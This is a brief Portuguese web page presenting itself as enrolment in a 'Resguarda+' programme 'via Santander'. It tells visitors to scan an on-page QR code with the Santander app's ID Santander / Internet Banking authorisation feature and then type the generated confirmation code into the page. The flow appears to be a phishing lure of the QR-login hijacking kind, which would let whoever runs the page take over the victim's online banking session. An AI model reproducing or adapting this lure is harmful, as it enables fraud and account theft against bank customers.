Adesão ao Programa Resguarda+

via Santander

Bem-vindo ao processo de adesão do Programa Resguarda+ pelo Banco Santander. Siga os passos abaixo
para completar sua adesão:

Autenticação via QR Code:
  • Abra o aplicativo Santander no seu dispositivo móvel.
  • Clique na opção ID Santander e selecione Internet Banking
  • Direcione a câmera para o QR Code exibido abaixo.
Após escanear o QR Code, o aplicativo do Santander gerará um código de confirmação.
Insira o código gerado no campo abaixo:
Confirmar adesão
